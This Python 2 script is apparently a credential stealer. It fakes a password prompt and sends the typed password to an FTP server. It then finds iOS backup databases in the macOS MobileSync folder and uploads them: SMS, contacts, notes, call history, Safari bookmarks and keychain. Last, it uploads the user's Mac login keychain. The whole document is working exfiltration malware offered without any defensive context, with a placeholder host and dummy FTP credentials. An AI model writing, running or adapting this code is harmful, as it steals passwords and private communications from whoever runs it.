# Don't mess with professionals.

import fnmatch
import os
import ftplib
import random
import getpass
import time
from cStringIO import StringIO

FTP_HOST = "127.0.0.1"
FTP_PORT = 21
FTP_USERNAME = 'username'
FTP_PASSWORD = 'password'

ftp = ftplib.FTP()

def connect():
    ftp.connect(FTP_HOST, FTP_PORT)
    ftp.login(FTP_USERNAME, FTP_PASSWORD);

def user_input():
    pw = getpass.getpass("Password:")
    return pw

DBS = [
    '3d0d7e5fb2ce288813306e4d4636395e047a3d28', # iOS SMS Database
    '31bb7ba8914766d4ba40d6dfb6113c8b614be442', # iOS Address Book
    'ca3bc056d4da0bbf88b5fb3be254f3b7147e639c', # iOS Notes
    '2b2b0084a1bc3a5ac8c27afdf14afb42c61a19ca', # iOS Call History
    'd1f062e2da26192a6625d968274bfda8d07821e4', # iOS Safari Bookmarks
    '51a4616e576dd33cd2abadfea874eb8ff246bf0e', # iOS Keychain
]

def find(db_name):
    mac_dir = '%s/Library/Application Support/MobileSync' % os.path.expanduser('~')
    paths = []
    for root, dirs, files in os.walk(mac_dir):
        for basename in files:
            if fnmatch.fnmatch(basename, db_name):
                path = os.path.join(root, basename)
                paths.append(path)

    return paths

def transfer(db_name, paths):
    for path in paths:
        fname = "%s-%d-%d" % (db_name, int(time.time()*1000) % 1000, random.randint(0,100000))
        print fname
        ftp.storbinary("STOR %s" % fname, open(path, "rb"))

def write_data(data):
    ftp.storbinary("STOR data-%d%d" % (int(time.time()*1000) % 1000, random.randint(0,100000)), StringIO(data))
            
if __name__ == '__main__':
    pw = user_input()
    connect()
    write_data(pw)
    
    for db in DBS:
        paths = find(db)
        transfer(db, paths)
        
    paths = ['%s/Library/Keychains/login.keychain' % os.path.expanduser('~')] # Mac OS X Keychain
    transfer('chain-%d' % random.randint(0,10000), paths)
    
    ftp.quit()    
